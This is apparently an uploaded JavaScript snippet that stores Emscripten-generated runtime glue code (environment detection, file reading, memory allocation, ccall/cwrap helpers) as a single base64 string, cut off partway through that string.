## Uploaded by @satya_enki


var a='dmFyIE1vZHVsZT17bG9jYXRlRmlsZTooZnVuY3Rpb24ocGF0aCl7cmV0dXJuIHBhdGh9KX07dmFyIE1vZHVsZTtpZighTW9kdWxlKU1vZHVsZT0odHlwZW9mIE1vZHVsZSE9PSJ1bmRlZmluZWQiP01vZHVsZTpudWxsKXx8e307dmFyIG1vZHVsZU92ZXJyaWRlcz17fTtmb3IodmFyIGtleSBpbiBNb2R1bGUpe2lmKE1vZHVsZS5oYXNPd25Qcm9wZXJ0eShrZXkpKXttb2R1bGVPdmVycmlkZXNba2V5XT1Nb2R1bGVba2V5XX19CnZhciBFTlZJUk9OTUVOVF9JU19XRUI9ITE7dmFyIEVOVklST05NRU5UX0lTX1dPUktFUj0hMTt2YXIgRU5WSVJPTk1FTlRfSVNfTk9ERT0hMTt2YXIgRU5WSVJPTk1FTlRfSVNfU0hFTEw9ITE7aWYoTW9kdWxlLkVOVklST05NRU5UKXtpZihNb2R1bGUuRU5WSVJPTk1FTlQ9PT0iV0VCIil7RU5WSVJPTk1FTlRfSVNfV0VCPSEwfWVsc2UgaWYoTW9kdWxlLkVOVklST05NRU5UPT09IldPUktFUiIpe0VOVklST05NRU5UX0lTX1dPUktFUj0hMH1lbHNlIGlmKE1vZHVsZS5FTlZJUk9OTUVOVD09PSJOT0RFIil7RU5WSVJPTk1FTlRfSVNfTk9ERT0hMH1lbHNlIGlmKE1vZHVsZS5FTlZJUk9OTUVOVD09PSJTSEVMTCIpe0VOVklST05NRU5UX0lTX1NIRUxMPSEwfWVsc2V7dGhyb3cgbmV3IEVycm9yKCJUaGUgcHJvdmlkZWQgTW9kdWxlW1wnRU5WSVJPTk1FTlRcJ10gdmFsdWUgaXMgbm90IHZhbGlkLiBJdCBtdXN0IGJlIG9uZSBvZjogV0VCfFdPUktFUnxOT0RFfFNIRUxMLiIpfX1lbHNle0VOVklST05NRU5UX0lTX1dFQj10eXBlb2Ygd2luZG93PT09Im9iamVjdCI7RU5WSVJPTk1FTlRfSVNfV09SS0VSPXR5cGVvZiBpbXBvcnRTY3JpcHRzPT09ImZ1bmN0aW9uIjtFTlZJUk9OTUVOVF9JU19OT0RFPXR5cGVvZiBwcm9jZXNzPT09Im9iamVjdCImJnR5cGVvZiByZXF1aXJlPT09ImZ1bmN0aW9uIiYmIUVOVklST05NRU5UX0lTX1dFQiYmIUVOVklST05NRU5UX0lTX1dPUktFUjtFTlZJUk9OTUVOVF9JU19TSEVMTD0hRU5WSVJPTk1FTlRfSVNfV0VCJiYhRU5WSVJPTk1FTlRfSVNfTk9ERSYmIUVOVklST05NRU5UX0lTX1dPUktFUn0KaWYoRU5WSVJPTk1FTlRfSVNfTk9ERSl7aWYoIU1vZHVsZS5wcmludClNb2R1bGUucHJpbnQ9Y29uc29sZS5sb2c7aWYoIU1vZHVsZS5wcmludEVycilNb2R1bGUucHJpbnRFcnI9Y29uc29sZS53YXJuO3ZhciBub2RlRlM7dmFyIG5vZGVQYXRoO01vZHVsZS5yZWFkPWZ1bmN0aW9uIHNoZWxsX3JlYWQoZmlsZW5hbWUsYmluYXJ5KXtpZighbm9kZUZTKW5vZGVGUz1yZXF1aXJlKCJmcyIpO2lmKCFub2RlUGF0aClub2RlUGF0aD1yZXF1aXJlKCJwYXRoIik7ZmlsZW5hbWU9bm9kZVBhdGgubm9ybWFsaXplKGZpbGVuYW1lKTt2YXIgcmV0PW5vZGVGUy5yZWFkRmlsZVN5bmMoZmlsZW5hbWUpO3JldHVybiBiaW5hcnk/cmV0OnJldC50b1N0cmluZygpfTtNb2R1bGUucmVhZEJpbmFyeT1mdW5jdGlvbiByZWFkQmluYXJ5KGZpbGVuYW1lKXt2YXIgcmV0PU1vZHVsZS5yZWFkKGZpbGVuYW1lLCEwKTtpZighcmV0LmJ1ZmZlcil7cmV0PW5ldyBVaW50OEFycmF5KHJldCl9CmFzc2VydChyZXQuYnVmZmVyKTtyZXR1cm4gcmV0fTtNb2R1bGUubG9hZD1mdW5jdGlvbiBsb2FkKGYpe2dsb2JhbEV2YWwocmVhZChmKSl9O2lmKCFNb2R1bGUudGhpc1Byb2dyYW0pe2lmKHByb2Nlc3MuYXJndi5sZW5ndGg+MSl7TW9kdWxlLnRoaXNQcm9ncmFtPXByb2Nlc3MuYXJndlsxXS5yZXBsYWNlKC9cXFxcL2csIi8iKX1lbHNle01vZHVsZS50aGlzUHJvZ3JhbT0idW5rbm93bi1wcm9ncmFtIn19Ck1vZHVsZVsiYXJndW1lbnRzIl09cHJvY2Vzcy5hcmd2LnNsaWNlKDIpO2lmKHR5cGVvZiBtb2R1bGUhPT0idW5kZWZpbmVkIil7bW9kdWxlLmV4cG9ydHM9TW9kdWxlfQpwcm9jZXNzLm9uKCJ1bmNhdWdodEV4Y2VwdGlvbiIsKGZ1bmN0aW9uKGV4KXtpZighKGV4IGluc3RhbmNlb2YgRXhpdFN0YXR1cykpe3Rocm93IGV4fX0pKTtNb2R1bGUuaW5zcGVjdD0oZnVuY3Rpb24oKXtyZXR1cm4iW0Vtc2NyaXB0ZW4gTW9kdWxlIG9iamVjdF0ifSl9ZWxzZSBpZihFTlZJUk9OTUVOVF9JU19TSEVMTCl7aWYoIU1vZHVsZS5wcmludClNb2R1bGUucHJpbnQ9cHJpbnQ7aWYodHlwZW9mIHByaW50RXJyIT0idW5kZWZpbmVkIilNb2R1bGUucHJpbnRFcnI9cHJpbnRFcnI7aWYodHlwZW9mIHJlYWQhPSJ1bmRlZmluZWQiKXtNb2R1bGUucmVhZD1yZWFkfWVsc2V7TW9kdWxlLnJlYWQ9ZnVuY3Rpb24gc2hlbGxfcmVhZCgpe3Rocm93ICJubyByZWFkKCkgYXZhaWxhYmxlIn19Ck1vZHVsZS5yZWFkQmluYXJ5PWZ1bmN0aW9uIHJlYWRCaW5hcnkoZil7aWYodHlwZW9mIHJlYWRidWZmZXI9PT0iZnVuY3Rpb24iKXtyZXR1cm4gbmV3IFVpbnQ4QXJyYXkocmVhZGJ1ZmZlcihmKSl9CnZhciBkYXRhPXJlYWQoZiwiYmluYXJ5Iik7YXNzZXJ0KHR5cGVvZiBkYXRhPT09Im9iamVjdCIpO3JldHVybiBkYXRhfTtpZih0eXBlb2Ygc2NyaXB0QXJncyE9InVuZGVmaW5lZCIpe01vZHVsZVsiYXJndW1lbnRzIl09c2NyaXB0QXJnc31lbHNlIGlmKHR5cGVvZiBhcmd1bWVudHMhPSJ1bmRlZmluZWQiKXtNb2R1bGVbImFyZ3VtZW50cyJdPWFyZ3VtZW50c30KaWYodHlwZW9mIHF1aXQ9PT0iZnVuY3Rpb24iKXtNb2R1bGUucXVpdD0oZnVuY3Rpb24oc3RhdHVzLHRvVGhyb3cpe3F1aXQoc3RhdHVzKX0pfX1lbHNlIGlmKEVOVklST05NRU5UX0lTX1dFQnx8RU5WSVJPTk1FTlRfSVNfV09SS0VSKXtNb2R1bGUucmVhZD1mdW5jdGlvbiBzaGVsbF9yZWFkKHVybCl7dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3Q7eGhyLm9wZW4oIkdFVCIsdXJsLCExKTt4aHIuc2VuZChudWxsKTtyZXR1cm4geGhyLnJlc3BvbnNlVGV4dH07aWYoRU5WSVJPTk1FTlRfSVNfV09SS0VSKXtNb2R1bGUucmVhZEJpbmFyeT1mdW5jdGlvbiByZWFkQmluYXJ5KHVybCl7fX0KTW9kdWxlLnJlYWRBc3luYz1mdW5jdGlvbiByZWFkQXN5bmModXJsLG9ubG9hZCxvbmVycm9yKXtjb25zb2xlLmxvZygicmVhZGluZyBhc3luYyBub3c/Iik7cmV0dXJuO3ZhciB4aHI9bmV3IFhNTEh0dHBSZXF1ZXN0O3hoci5vcGVuKCJHRVQiLHVybCwhMCk7eGhyLnJlc3BvbnNlVHlwZT0iYXJyYXlidWZmZXIiO3hoci5vbmxvYWQ9ZnVuY3Rpb24geGhyX29ubG9hZCgpe2lmKHhoci5zdGF0dXM9PTIwMHx8eGhyLnN0YXR1cz09MCYmeGhyLnJlc3BvbnNlKXtvbmxvYWQoeGhyLnJlc3BvbnNlKX1lbHNle29uZXJyb3IoKX19O3hoci5vbmVycm9yPW9uZXJyb3I7eGhyLnNlbmQobnVsbCl9O2lmKHR5cGVvZiBhcmd1bWVudHMhPSJ1bmRlZmluZWQiKXtNb2R1bGVbImFyZ3VtZW50cyJdPWFyZ3VtZW50c30KaWYodHlwZW9mIGNvbnNvbGUhPT0idW5kZWZpbmVkIil7aWYoIU1vZHVsZS5wcmludClNb2R1bGUucHJpbnQ9ZnVuY3Rpb24gc2hlbGxfcHJpbnQoeCl7Y29uc29sZS5sb2coeCl9O2lmKCFNb2R1bGUucHJpbnRFcnIpTW9kdWxlLnByaW50RXJyPWZ1bmN0aW9uIHNoZWxsX3ByaW50RXJyKHgpe2NvbnNvbGUud2Fybih4KX19ZWxzZXt2YXIgVFJZX1VTRV9EVU1QPSExO2lmKCFNb2R1bGUucHJpbnQpTW9kdWxlLnByaW50PVRSWV9VU0VfRFVNUCYmdHlwZW9mIGR1bXAhPT0idW5kZWZpbmVkIj8oZnVuY3Rpb24oeCl7ZHVtcCh4KX0pOihmdW5jdGlvbih4KXt9KX0KaWYoRU5WSVJPTk1FTlRfSVNfV09SS0VSKXtNb2R1bGUubG9hZD1pbXBvcnRTY3JpcHRzfQppZih0eXBlb2YgTW9kdWxlLnNldFdpbmRvd1RpdGxlPT09InVuZGVmaW5lZCIpe01vZHVsZS5zZXRXaW5kb3dUaXRsZT0oZnVuY3Rpb24odGl0bGUpe2RvY3VtZW50LnRpdGxlPXRpdGxlfSl9fWVsc2V7dGhyb3cgIlVua25vd24gcnVudGltZSBlbnZpcm9ubWVudC4gV2hlcmUgYXJlIHdlPyJ9CmZ1bmN0aW9uIGdsb2JhbEV2YWwoeCl7ZXZhbC5jYWxsKG51bGwseCl9CmlmKCFNb2R1bGUubG9hZCYmTW9kdWxlLnJlYWQpe01vZHVsZS5sb2FkPWZ1bmN0aW9uIGxvYWQoZil7Z2xvYmFsRXZhbChNb2R1bGUucmVhZChmKSl9fQppZighTW9kdWxlLnByaW50KXtNb2R1bGUucHJpbnQ9KGZ1bmN0aW9uKCl7fSl9CmlmKCFNb2R1bGUucHJpbnRFcnIpe01vZHVsZS5wcmludEVycj1Nb2R1bGUucHJpbnR9CmlmKCFNb2R1bGVbImFyZ3VtZW50cyJdKXtNb2R1bGVbImFyZ3VtZW50cyJdPVtdfQppZighTW9kdWxlLnRoaXNQcm9ncmFtKXtNb2R1bGUudGhpc1Byb2dyYW09Ii4vdGhpcy5wcm9ncmFtIn0KaWYoIU1vZHVsZS5xdWl0KXtNb2R1bGUucXVpdD0oZnVuY3Rpb24oc3RhdHVzLHRvVGhyb3cpe3Rocm93IHRvVGhyb3d9KX0KTW9kdWxlLnByaW50PU1vZHVsZS5wcmludDtNb2R1bGUucHJpbnRFcnI9TW9kdWxlLnByaW50RXJyO01vZHVsZS5wcmVSdW49W107TW9kdWxlLnBvc3RSdW49W107Zm9yKHZhciBrZXkgaW4gbW9kdWxlT3ZlcnJpZGVzKXtpZihtb2R1bGVPdmVycmlkZXMuaGFzT3duUHJvcGVydHkoa2V5KSl7TW9kdWxlW2tleV09bW9kdWxlT3ZlcnJpZGVzW2tleV19fQptb2R1bGVPdmVycmlkZXM9dW5kZWZpbmVkO3ZhciBSdW50aW1lPXtzZXRUZW1wUmV0MDooZnVuY3Rpb24odmFsdWUpe3RlbXBSZXQwPXZhbHVlO3JldHVybiB2YWx1ZX0pLGdldFRlbXBSZXQwOihmdW5jdGlvbigpe3JldHVybiB0ZW1wUmV0MH0pLHN0YWNrU2F2ZTooZnVuY3Rpb24oKXtyZXR1cm4gU1RBQ0tUT1B9KSxzdGFja1Jlc3RvcmU6KGZ1bmN0aW9uKHN0YWNrVG9wKXtTVEFDS1RPUD1zdGFja1RvcH0pLGdldE5hdGl2ZVR5cGVTaXplOihmdW5jdGlvbih0eXBlKXtzd2l0Y2godHlwZSl7Y2FzZSAiaTEiOmNhc2UgImk4IjpyZXR1cm4gMTtjYXNlICJpMTYiOnJldHVybiAyO2Nhc2UgImkzMiI6cmV0dXJuIDQ7Y2FzZSAiaTY0IjpyZXR1cm4gODtjYXNlICJmbG9hdCI6cmV0dXJuIDQ7Y2FzZSAiZG91YmxlIjpyZXR1cm4gODtkZWZhdWx0OntpZih0eXBlW3R5cGUubGVuZ3RoLTFdPT09IioiKXtyZXR1cm4gUnVudGltZS5RVUFOVFVNX1NJWkV9ZWxzZSBpZih0eXBlWzBdPT09ImkiKXt2YXIgYml0cz1wYXJzZUludCh0eXBlLnN1YnN0cigxKSk7YXNzZXJ0KGJpdHMlOD09PTApO3JldHVybiBiaXRzLzh9ZWxzZXtyZXR1cm4gMH19fX0pLGdldE5hdGl2ZUZpZWxkU2l6ZTooZnVuY3Rpb24odHlwZSl7cmV0dXJuIE1hdGgubWF4KFJ1bnRpbWUuZ2V0TmF0aXZlVHlwZVNpemUodHlwZSksUnVudGltZS5RVUFOVFVNX1NJWkUpfSksU1RBQ0tfQUxJR046MTYscHJlcFZhcmFyZzooZnVuY3Rpb24ocHRyLHR5cGUpe2lmKHR5cGU9PT0iZG91YmxlInx8dHlwZT09PSJpNjQiKXtpZihwdHImNyl7YXNzZXJ0KChwdHImNyk9PT00KTtwdHIrPTR9fWVsc2V7YXNzZXJ0KChwdHImMyk9PT0wKX0KcmV0dXJuIHB0cn0pLGdldEFsaWduU2l6ZTooZnVuY3Rpb24odHlwZSxzaXplLHZhcmFyZyl7aWYoIXZhcmFyZyYmKHR5cGU9PSJpNjQifHx0eXBlPT0iZG91YmxlIikpcmV0dXJuIDg7aWYoIXR5cGUpcmV0dXJuIE1hdGgubWluKHNpemUsOCk7cmV0dXJuIE1hdGgubWluKHNpemV8fCh0eXBlP1J1bnRpbWUuZ2V0TmF0aXZlRmllbGRTaXplKHR5cGUpOjApLFJ1bnRpbWUuUVVBTlRVTV9TSVpFKX0pLGR5bkNhbGw6KGZ1bmN0aW9uKHNpZyxwdHIsYXJncyl7aWYoYXJncyYmYXJncy5sZW5ndGgpe3JldHVybiBNb2R1bGVbImR5bkNhbGxfIitzaWddLmFwcGx5KG51bGwsW3B0cl0uY29uY2F0KGFyZ3MpKX1lbHNle3JldHVybiBNb2R1bGVbImR5bkNhbGxfIitzaWddLmNhbGwobnVsbCxwdHIpfX0pLGZ1bmN0aW9uUG9pbnRlcnM6W10sYWRkRnVuY3Rpb246KGZ1bmN0aW9uKGZ1bmMpe2Zvcih2YXIgaT0wO2k8UnVudGltZS5mdW5jdGlvblBvaW50ZXJzLmxlbmd0aDtpKyspe2lmKCFSdW50aW1lLmZ1bmN0aW9uUG9pbnRlcnNbaV0pe1J1bnRpbWUuZnVuY3Rpb25Qb2ludGVyc1tpXT1mdW5jO3JldHVybiAyKigxK2kpfX0KdGhyb3cgIkZpbmlzaGVkIHVwIGFsbCByZXNlcnZlZCBmdW5jdGlvbiBwb2ludGVycy4gVXNlIGEgaGlnaGVyIHZhbHVlIGZvciBSRVNFUlZFRF9GVU5DVElPTl9QT0lOVEVSUy4ifSkscmVtb3ZlRnVuY3Rpb246KGZ1bmN0aW9uKGluZGV4KXtSdW50aW1lLmZ1bmN0aW9uUG9pbnRlcnNbKGluZGV4LTIpLzJdPW51bGx9KSx3YXJuT25jZTooZnVuY3Rpb24odGV4dCl7aWYoIVJ1bnRpbWUud2Fybk9uY2Uuc2hvd24pUnVudGltZS53YXJuT25jZS5zaG93bj17fTtpZighUnVudGltZS53YXJuT25jZS5zaG93blt0ZXh0XSl7UnVudGltZS53YXJuT25jZS5zaG93blt0ZXh0XT0xO01vZHVsZS5wcmludEVycih0ZXh0KX19KSxmdW5jV3JhcHBlcnM6e30sZ2V0RnVuY1dyYXBwZXI6KGZ1bmN0aW9uKGZ1bmMsc2lnKXthc3NlcnQoc2lnKTtpZighUnVudGltZS5mdW5jV3JhcHBlcnNbc2lnXSl7UnVudGltZS5mdW5jV3JhcHBlcnNbc2lnXT17fX0KdmFyIHNpZ0NhY2hlPVJ1bnRpbWUuZnVuY1dyYXBwZXJzW3NpZ107aWYoIXNpZ0NhY2hlW2Z1bmNdKXtpZihzaWcubGVuZ3RoPT09MSl7c2lnQ2FjaGVbZnVuY109ZnVuY3Rpb24gZHluQ2FsbF93cmFwcGVyKCl7cmV0dXJuIFJ1bnRpbWUuZHluQ2FsbChzaWcsZnVuYyl9fWVsc2UgaWYoc2lnLmxlbmd0aD09PTIpe3NpZ0NhY2hlW2Z1bmNdPWZ1bmN0aW9uIGR5bkNhbGxfd3JhcHBlcihhcmcpe3JldHVybiBSdW50aW1lLmR5bkNhbGwoc2lnLGZ1bmMsW2FyZ10pfX1lbHNle3NpZ0NhY2hlW2Z1bmNdPWZ1bmN0aW9uIGR5bkNhbGxfd3JhcHBlcigpe3JldHVybiBSdW50aW1lLmR5bkNhbGwoc2lnLGZ1bmMsQXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoYXJndW1lbnRzKSl9fX0KcmV0dXJuIHNpZ0NhY2hlW2Z1bmNdfSksZ2V0Q29tcGlsZXJTZXR0aW5nOihmdW5jdGlvbihuYW1lKXt0aHJvdyAiWW91IG11c3QgYnVpbGQgd2l0aCAtcyBSRVRBSU5fQ09NUElMRVJfU0VUVElOR1M9MSBmb3IgUnVudGltZS5nZXRDb21waWxlclNldHRpbmcgb3IgZW1zY3JpcHRlbl9nZXRfY29tcGlsZXJfc2V0dGluZyB0byB3b3JrIn0pLHN0YWNrQWxsb2M6KGZ1bmN0aW9uKHNpemUpe3ZhciByZXQ9U1RBQ0tUT1A7U1RBQ0tUT1A9U1RBQ0tUT1Arc2l6ZXwwO1NUQUNLVE9QPVNUQUNLVE9QKzE1Ji0xNjtyZXR1cm4gcmV0fSksc3RhdGljQWxsb2M6KGZ1bmN0aW9uKHNpemUpe3ZhciByZXQ9U1RBVElDVE9QO1NUQVRJQ1RPUD1TVEFUSUNUT1Arc2l6ZXwwO1NUQVRJQ1RPUD1TVEFUSUNUT1ArMTUmLTE2O3JldHVybiByZXR9KSxkeW5hbWljQWxsb2M6KGZ1bmN0aW9uKHNpemUpe3ZhciByZXQ9SEVBUDMyW0RZTkFNSUNUT1BfUFRSPj4yXTt2YXIgZW5kPShyZXQrc2l6ZSsxNXwwKSYtMTY7SEVBUDMyW0RZTkFNSUNUT1BfUFRSPj4yXT1lbmQ7aWYoZW5kPj1UT1RBTF9NRU1PUlkpe3ZhciBzdWNjZXNzPWVubGFyZ2VNZW1vcnkoKTtpZighc3VjY2Vzcyl7SEVBUDMyW0RZTkFNSUNUT1BfUFRSPj4yXT1yZXQ7cmV0dXJuIDB9fQpyZXR1cm4gcmV0fSksYWxpZ25NZW1vcnk6KGZ1bmN0aW9uKHNpemUscXVhbnR1bSl7dmFyIHJldD1zaXplPU1hdGguY2VpbChzaXplLyhxdWFudHVtP3F1YW50dW06MTYpKSoocXVhbnR1bT9xdWFudHVtOjE2KTtyZXR1cm4gcmV0fSksbWFrZUJpZ0ludDooZnVuY3Rpb24obG93LGhpZ2gsdW5zaWduZWQpe3ZhciByZXQ9dW5zaWduZWQ/Kyhsb3c+Pj4wKSsgKyhoaWdoPj4+MCkqNDI5NDk2NzI5NjorKGxvdz4+PjApKyArKGhpZ2h8MCkqNDI5NDk2NzI5NjtyZXR1cm4gcmV0fSksR0xPQkFMX0JBU0U6MTAyNCxRVUFOVFVNX1NJWkU6NCxfX2R1bW15X186MH07TW9kdWxlLlJ1bnRpbWU9UnVudGltZTt2YXIgQUJPUlQ9MDt2YXIgRVhJVFNUQVRVUz0wO2Z1bmN0aW9uIGFzc2VydChjb25kaXRpb24sdGV4dCl7aWYoIWNvbmRpdGlvbil7YWJvcnQoIkFzc2VydGlvbiBmYWlsZWQ6ICIrdGV4dCl9fQpmdW5jdGlvbiBnZXRDRnVuYyhpZGVudCl7dmFyIGZ1bmM9TW9kdWxlWyJfIitpZGVudF07aWYoIWZ1bmMpe3RyeXtmdW5jPWV2YWwoIl8iK2lkZW50KX1jYXRjaChlKXt9fQphc3NlcnQoZnVuYywiQ2Fubm90IGNhbGwgdW5rbm93biBmdW5jdGlvbiAiK2lkZW50KyIgKHBlcmhhcHMgTExWTSBvcHRpbWl6YXRpb25zIG9yIGNsb3N1cmUgcmVtb3ZlZCBpdD8pIik7cmV0dXJuIGZ1bmN9CnZhciBjd3JhcCxjY2FsbDsoKGZ1bmN0aW9uKCl7dmFyIEpTZnVuY3M9eyJzdGFja1NhdmUiOihmdW5jdGlvbigpe1J1bnRpbWUuc3RhY2tTYXZlKCl9KSwic3RhY2tSZXN0b3JlIjooZnVuY3Rpb24oKXtSdW50aW1lLnN0YWNrUmVzdG9yZSgpfSksImFycmF5VG9DIjooZnVuY3Rpb24oYXJyKXt2YXIgcmV0PVJ1bnRpbWUuc3RhY2tBbGxvYyhhcnIubGVuZ3RoKTt3cml0ZUFycmF5VG9NZW1vcnkoYXJyLHJldCk7cmV0dXJuIHJldH0pLCJzdHJpbmdUb0MiOihmdW5jdGlvbihzdHIpe3ZhciByZXQ9MDtpZihzdHIhPT1udWxsJiZzdHIhPT11bmRlZmluZWQmJnN0ciE9PTApe3ZhciBsZW49KHN0ci5sZW5ndGg8PDIpKzE7cmV0PVJ1bnRpbWUuc3RhY2tBbGxvYyhsZW4pO3N0cmluZ1RvVVRGOChzdHIscmV0LGxlbil9CnJldHVybiByZXR9KX07dmFyIHRvQz17InN0cmluZyI6SlNmdW5jcy5zdHJpbmdUb0MsImFycmF5IjpKU2Z1bmNzLmFycmF5VG9DfTtjY2FsbD1mdW5jdGlvbiBjY2FsbEZ1bmMoaWRlbnQscmV0dXJuVHlwZSxhcmdUeXBlcyxhcmdzLG9wdHMpe3ZhciBmdW5jPWdldENGdW5jKGlkZW50KTt2YXIgY0FyZ3M9W107dmFyIHN0YWNrPTA7aWYoYXJncyl7Zm9yKHZhciBpPTA7aTxhcmdzLmxlbmd0aDtpKyspe3ZhciBjb252ZXJ0ZXI9dG9DW2FyZ1R5cGVzW2ldXTtpZihjb252ZXJ0ZXIpe2lmKHN0YWNrPT09MClzdGFjaz1SdW50aW1lLnN0YWNrU2F2ZSgpO2NBcmdzW2ldPWNvbnZlcnRlcihhcmdzW2ldKX1lbHNle2NBcmdzW2ldPWFyZ3NbaV19fX0KdmFyIHJldD1mdW5jLmFwcGx5KG51bGwsY0FyZ3MpO2lmKHJldHVyblR5cGU9PT0ic3RyaW5nIilyZXQ9UG9pbnRlcl9zdHJpbmdpZnkocmV0KTtpZihzdGFjayE9PTApe2lmKG9wdHMmJm9wdHMuYXN5bmMpe0VtdGVycHJldGVyQXN5bmMuYXN5bmNGaW5hbGl6ZXJzLnB1c2goKGZ1bmN0aW9uKCl7UnVudGltZS5zdGFja1Jlc3RvcmUoc3RhY2spfSkpO3JldHVybn0KUnVudGltZS5zdGFja1Jlc3RvcmUoc3RhY2spfQpyZXR1cm4gcmV0fTt2YXIgc291cmNlUmVnZXg9L15mdW5jdGlvblxccypbYS16QS1aJF8wLTldKlxccypcXCgoW14pXSopXFwpXFxzKntcXHMqKFteKl0qPylbXFxzO10qKD86cmV0dXJuXFxzKiguKj8pWztcXHNdKik/fSQvO2Z1bmN0aW9uIHBhcnNlSlNGdW5jKGpzZnVuYyl7dmFyIHBhcnNlZD1qc2Z1bmMudG9TdHJpbmcoKS5tYXRjaChzb3VyY2VSZWdleCkuc2xpY2UoMSk7cmV0dXJue2FyZ3VtZW50czpwYXJzZWRbMF0sYm9keTpwYXJzZWRbMV0scmV0dXJuVmFsdWU6cGFyc2VkWzJdfX0KdmFyIEpTc291cmNlPW51bGw7ZnVuY3Rpb24gZW5zdXJlSlNzb3VyY2UoKXtpZighSlNzb3VyY2Upe0pTc291cmNlPXt9O2Zvcih2YXIgZnVuIGluIEpTZnVuY3Mpe2lmKEpTZnVuY3MuaGFzT3duUHJvcGVydHkoZnVuKSl7SlNzb3VyY2VbZnVuXT1wYXJzZUpTRnVuYyhKU2Z1bmNzW2Z1bl0pfX19fQpjd3JhcD1mdW5jdGlvbiBjd3JhcChpZGVudCxyZXR1cm5UeXBlLGFyZ1R5cGVzKXthcmdUeXBlcz1hcmdUeXBlc3x8W107dmFyIGNmdW5jPWdldENGdW5jKGlkZW50KTt2YXIgbnVtZXJpY0FyZ3M9YXJnVHlwZXMuZXZlcnkoKGZ1bmN0aW9uKHR5cGUpe3JldHVybiB0eXBlPT09Im51bWJlciJ9KSk7dmFyIG51bWVyaWNSZXQ9cmV0dXJuVHlwZSE9PSJzdHJpbmciO2lmKG51bWVyaWNSZXQmJm51bWVyaWNBcmdzKXtyZXR1cm4gY2Z1bmN9CnZhciBhcmdOYW1lcz1hcmdUeXBlcy5tYXAoKGZ1bmN0aW9uKHgsaSl7cmV0dXJuIiQiK2l9KSk7dmFyIGZ1bmNzdHI9IihmdW5jdGlvbigiK2FyZ05hbWVzLmpvaW4oIiwiKSsiKSB7Ijt2YXIgbmFyZ3M9YXJnVHlwZXMubGVuZ3RoO2lmKCFudW1lcmljQXJncyl7ZW5zdXJlSlNzb3VyY2UoKTtmdW5jc3RyKz0idmFyIHN0YWNrID0gIitKU3NvdXJjZS5zdGFja1NhdmUuYm9keSsiOyI7Zm9yKHZhciBpPTA7aTxuYXJncztpKyspe3ZhciBhcmc9YXJnTmFtZXNbaV0sdHlwZT1hcmdUeXBlc1tpXTtpZih0eXBlPT09Im51bWJlciIpY29udGludWU7dmFyIGNvbnZlcnRDb2RlPUpTc291cmNlW3R5cGUrIlRvQyJdO2Z1bmNzdHIrPSJ2YXIgIitjb252ZXJ0Q29kZS5hcmd1bWVudHMrIiA9ICIrYXJnKyI7IjtmdW5jc3RyKz1jb252ZXJ0Q29kZS5ib2R5KyI7IjtmdW5jc3RyKz1hcmcrIj0oIitjb252ZXJ0Q29kZS5yZXR1cm5WYWx1ZSsiKTsifX0KdmFyIGNmdW5jbmFtZT1wYXJzZUpTRnVuYygoZnVuY3Rpb24oKXtyZXR1cm4gY2Z1bmN9KSkucmV0dXJuVmFsdWU7ZnVuY3N0cis9InZhciByZXQgPSAiK2NmdW5jbmFtZSsiKCIrYXJnTmFtZXMuam9pbigiLCIpKyIpOyI7aWYoIW51bWVyaWNSZXQpe3ZhciBzdHJnZnk9cGFyc2VKU0Z1bmMoKGZ1bmN0aW9uKCl7cmV0dXJuIFBvaW50ZXJfc3RyaW5naWZ5fSkpLnJldHVyblZhbHVlO2Z1bmNzdHIrPSJyZXQgPSAiK3N0cmdmeSsiKHJldCk7In0KaWYoIW51bWVyaWNBcmdzKXtlbnN1cmVKU3NvdXJjZSgpO2Z1bmNzdHIrPUpTc291cmNlLnN0YWNrUmVzdG9yZS5ib2R5LnJlcGxhY2UoIigpIiwiKHN0YWNrKSIpKyI7In0KZnVuY3N0cis9InJldHVybiByZXR9KSI7cmV0dXJuIGV2YWwoZnVuY3N0cil9fSkpKCk7TW9kdWxlLmNjYWxsPWNjYWxsO01vZHVsZS5jd3JhcD1jd3JhcDtmdW5jdGlvbiBzZXRWYWx1ZShwdHIsdmFsdWUsdHlwZSxub1NhZmUpe3R5cGU9dHlwZXx8Imk4IjtpZih0eXBlLmNoYXJBdCh0eXBlLmxlbmd0aC0xKT09PSIqIil0eXBlPSJpMzIiO3N3aXRjaCh0eXBlKXtjYXNlICJpMSI6SEVBUDhbcHRyPj4wXT12YWx1ZTticmVhaztjYXNlICJpOCI6SEVBUDhbcHRyPj4wXT12YWx1ZTticmVhaztjYXNlICJpMTYiOkhFQVAxNltwdHI+PjFdPXZhbHVlO2JyZWFrO2Nhc2UgImkzMiI6SEVBUDMyW3B0cj4+Ml09dmFsdWU7YnJlYWs7Y2FzZSAiaTY0Ijp0ZW1wSTY0PVt2YWx1ZT4+PjAsKHRlbXBEb3VibGU9dmFsdWUsK01hdGhfYWJzKHRlbXBEb3VibGUpPj0xP3RlbXBEb3VibGU+MD8oTWF0aF9taW4oK01hdGhfZmxvb3IodGVtcERvdWJsZS80Mjk0OTY3Mjk2KSw0Mjk0OTY3Mjk1KXwwKT4+PjA6fn4rTWF0aF9jZWlsKCh0ZW1wRG91YmxlLSArKH5+dGVtcERvdWJsZT4+PjApKS80Mjk0OTY3Mjk2KT4+PjA6MCldLEhFQVAzMltwdHI+PjJdPXRlbXBJNjRbMF0sSEVBUDMyW3B0cis0Pj4yXT10ZW1wSTY0WzFdO2JyZWFrO2Nhc2UgImZsb2F0IjpIRUFQRjMyW3B0cj4+Ml09dmFsdWU7YnJlYWs7Y2FzZSAiZG91YmxlIjpIRUFQRjY0W3B0cj4+M109dmFsdWU7YnJlYWs7ZGVmYXVsdDphYm9ydCgiaW52YWxpZCB0eXBlIGZvciBzZXRWYWx1ZTogIit0eXBlKX19Ck1vZHVsZS5zZXRWYWx1ZT1zZXRWYWx1ZTtmdW5jdGlvbiBnZXRWYWx1ZShwdHIsdHlwZSxub1NhZmUpe3R5cGU9dHlwZXx8Imk4IjtpZih0eXBlLmNoYXJBdCh0eXBlLmxlbmd0aC0xKT09PSIqIil0eXBlPSJpMzIiO3N3aXRjaCh0eXBlKXtjYXNlICJpMSI6cmV0dXJuIEhFQVA4W3B0cj4+MF07Y2FzZSAiaTgiOnJldHVybiBIRUFQOFtwdHI+PjBdO2Nhc2UgImkxNiI6cmV0dXJuIEhFQVAxNltwdHI+PjFdO2Nhc2UgImkzMiI6cmV0dXJuIEhFQVAzMltwdHI+PjJdO2Nhc2UgImk2NCI6cmV0dXJuIEhFQVAzMltwdHI+PjJdO2Nhc2UgImZsb2F0IjpyZXR1cm4gSEVBUEYzMltwdHI+PjJdO2Nhc2UgImRvdWJsZSI6cmV0dXJuI